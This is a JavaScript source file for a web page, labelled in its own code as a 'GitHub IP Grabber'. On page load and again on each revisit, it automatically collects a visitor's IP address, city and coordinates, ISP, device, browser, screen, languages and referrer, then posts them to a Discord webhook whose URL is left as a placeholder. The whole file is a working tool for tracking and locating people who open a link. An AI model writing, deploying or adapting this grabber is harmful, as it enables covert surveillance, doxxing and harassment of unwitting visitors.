// Configuration - Replace with your actual webhook URL
const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"

// Function to get user's IP and location data
async function captureIPData() {
  try {
    // Get IP and basic info from multiple sources for accuracy
    const ipResponse = await fetch("https://api.ipify.org?format=json")
    const ipData = await ipResponse.json()

    // Get detailed geolocation data
    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`)
    const geoData = await geoResponse.json()

    // Get additional IP info for verification
    const ipInfoResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`)
    const ipInfoData = await ipInfoResponse.json()

    // Parse user agent for detailed browser/OS info
    const userAgent = navigator.userAgent
    const browserInfo = parseUserAgent(userAgent)

    // Get screen and system info
    const screenInfo = {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
    }

    // Get timezone info
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone
    const timestamp = new Date().toISOString()

    // Get language preferences
    const languages = navigator.languages || [navigator.language]

    // Compile comprehensive data
    const capturedData = {
      ip: ipData.ip,
      country: geoData.country_name || ipInfoData.country || "Unknown",
      region: geoData.region || ipInfoData.region || "Unknown",
      city: geoData.city || ipInfoData.city || "Unknown",
      latitude: geoData.latitude || ipInfoData.loc?.split(",")[0] || "Unknown",
      longitude: geoData.longitude || ipInfoData.loc?.split(",")[1] || "Unknown",
      timezone: geoData.timezone || timezone,
      isp: geoData.org || ipInfoData.org || "Unknown",
      asn: geoData.asn || "Unknown",
      browser: browserInfo.browser,
      os: browserInfo.os,
      device: browserInfo.device,
      userAgent: userAgent,
      languages: languages,
      screenResolution: `${screenInfo.width}x${screenInfo.height}`,
      colorDepth: screenInfo.colorDepth,
      timestamp: timestamp,
      referrer: document.referrer || "Direct",
      url: window.location.href,
    }

    // Send to Discord webhook
    await sendToDiscord(capturedData)

    // Display data to user
    displayCapturedData(capturedData)

    return capturedData
  } catch (error) {
    console.error("Error capturing IP data:", error)
    showError("Failed to capture IP information")
  }
}

// Function to parse user agent for detailed info
function parseUserAgent(userAgent) {
  let browser = "Unknown"
  let os = "Unknown"
  let device = "Desktop"

  // Browser detection
  if (userAgent.includes("Firefox/")) {
    browser = "Firefox"
  } else if (userAgent.includes("Chrome/") && !userAgent.includes("Edg/") && !userAgent.includes("OPR/")) {
    browser = "Chrome"
  } else if (userAgent.includes("Safari/") && !userAgent.includes("Chrome/")) {
    browser = "Safari"
  } else if (userAgent.includes("Edg/")) {
    browser = "Edge"
  } else if (userAgent.includes("OPR/") || userAgent.includes("Opera/")) {
    browser = "Opera"
  }

  // OS detection
  if (userAgent.includes("Windows")) {
    os = "Windows"
    if (userAgent.includes("Windows NT 10.0")) os = "Windows 10/11"
    else if (userAgent.includes("Windows NT 6.3")) os = "Windows 8.1"
    else if (userAgent.includes("Windows NT 6.2")) os = "Windows 8"
    else if (userAgent.includes("Windows NT 6.1")) os = "Windows 7"
  } else if (userAgent.includes("Mac OS X")) {
    os = "macOS"
  } else if (userAgent.includes("Android")) {
    os = "Android"
    device = "Mobile"
  } else if (userAgent.includes("iOS") || userAgent.includes("iPhone") || userAgent.includes("iPad")) {
    os = "iOS"
    if (userAgent.includes("iPhone")) device = "iPhone"
    else if (userAgent.includes("iPad")) device = "iPad"
  } else if (userAgent.includes("Linux")) {
    os = "Linux"
  }

  // Device type detection
  if (device === "Desktop") {
    if (userAgent.includes("Mobile")) {
      device = "Mobile"
    } else if (userAgent.includes("Tablet")) {
      device = "Tablet"
    }
  }

  return { browser, os, device }
}

// Function to send data to Discord webhook
async function sendToDiscord(data) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
    console.warn("Discord webhook URL not configured")
    return
  }

  const embed = {
    title: "🎯 IP Address Auto-Captured",
    color: 0xff4444,
    fields: [
      {
        name: "🌐 IP Address",
        value: `\`${data.ip}\``,
        inline: true,
      },
      {
        name: "📍 Location",
        value: `${data.city}, ${data.region}, ${data.country}`,
        inline: true,
      },
      {
        name: "🗺️ Coordinates",
        value:
          data.latitude !== "Unknown" && data.longitude !== "Unknown"
            ? `[${data.latitude}, ${data.longitude}](https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude})`
            : "Unknown",
        inline: true,
      },
      {
        name: "⏰ Timestamp",
        value: `<t:${Math.floor(new Date(data.timestamp).getTime() / 1000)}:F>`,
        inline: true,
      },
      {
        name: "🌍 Timezone",
        value: data.timezone,
        inline: true,
      },
      {
        name: "🏢 ISP",
        value: data.isp,
        inline: true,
      },
      {
        name: "💻 Device Info",
        value: `**OS**: ${data.os}\n**Browser**: ${data.browser}\n**Type**: ${data.device}`,
        inline: false,
      },
      {
        name: "🖥️ Screen Info",
        value: `**Resolution**: ${data.screenResolution}\n**Color Depth**: ${data.colorDepth}-bit`,
        inline: true,
      },
      {
        name: "🔤 Languages",
        value: data.languages.join(", "),
        inline: true,
      },
      {
        name: "🔗 Referrer",
        value: data.referrer,
        inline: false,
      },
    ],
    footer: {
      text: "GitHub IP Grabber - High Accuracy",
    },
    timestamp: data.timestamp,
  }

  try {
    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ embeds: [embed] }),
    })
  } catch (error) {
    console.error("Error sending to Discord:", error)
  }
}

// Function to display captured data to user
function displayCapturedData(data) {
  const ipDataContainer = document.getElementById("ip-data")

  const fields = [
    { label: "IP Address", value: data.ip },
    { label: "Country", value: data.country },
    { label: "Region", value: data.region },
    { label: "City", value: data.city },
    { label: "ISP", value: data.isp },
    { label: "Timezone", value: data.timezone },
    { label: "Browser", value: data.browser },
    { label: "Operating System", value: data.os },
    { label: "Device Type", value: data.device },
    { label: "Screen Resolution", value: data.screenResolution },
    { label: "Languages", value: data.languages.join(", ") },
    { label: "Captured At", value: new Date(data.timestamp).toLocaleString() },
  ]

  ipDataContainer.innerHTML = fields
    .map(
      (field) => `
        <div>
            <label class="text-sm font-medium text-gray-500">${field.label}</label>
            <p class="font-mono text-sm bg-red-100 p-2 rounded border">${field.value}</p>
        </div>
    `,
    )
    .join("")

  // Hide loading and show content
  document.getElementById("loading").classList.add("hidden")
  document.getElementById("content").classList.remove("hidden")
}

// Function to show error
function showError(message) {
  document.getElementById("loading").innerHTML = `
        <div class="text-center">
            <i class="fas fa-exclamation-triangle text-red-600 text-4xl mb-4"></i>
            <p class="text-red-600 font-semibold">${message}</p>
        </div>
    `
}

// Auto-capture IP when page loads
document.addEventListener("DOMContentLoaded", () => {
  // Small delay to ensure page is fully loaded
  setTimeout(captureIPData, 500)
})

// Recapture when page becomes visible again
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    captureIPData()
  }
})
